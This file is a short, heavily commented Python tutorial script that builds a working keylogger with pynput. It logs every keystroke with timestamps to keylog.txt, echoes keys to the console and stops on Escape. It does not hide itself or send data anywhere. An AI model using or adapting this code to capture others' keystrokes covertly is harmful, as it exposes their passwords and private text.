# first we will get started with keylogger module
# importing the required modules

from pynput import keyboard
import logging

# next up we will set up logging configurations
'''
so here the logging.basicConfig sets up the configuration for logging
then logging.debug means it will now records all the keystrokes in the filename as keylog.txt 
and the format says that it will also store the time of the keystroke

'''
logging.basicConfig(filename="keylog.txt",level=logging.DEBUG, format='%(asctime)s:%(message)s')


# now creating a keypress function
def on_press(key):
    """Function called when a key is pressed"""
    try:
        # Regular character keys
        logging.info(f'Key {key.char} pressed')             # this function logging info gets the keypressed
                                                            #  and then we are printing that key 
        print(f'Key {key.char} pressed')
    except AttributeError:
        # Special keys (ctrl, alt, space, etc.)
        # This catches errors that happen when the key doesn't have a .char attribute (like special keys)
        logging.info(f'Special key {key} pressed')
        print(f'Special key {key} pressed')


def on_release(key):
    """Function called when a key is released"""
    if key == keyboard.Key.esc:         # This checks if the released key is the Escape key
        # Stop listener when Escape is pressed
        print("Escape pressed - stopping keylogger")
        return False

print("Keylogger started. Press Escape to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()



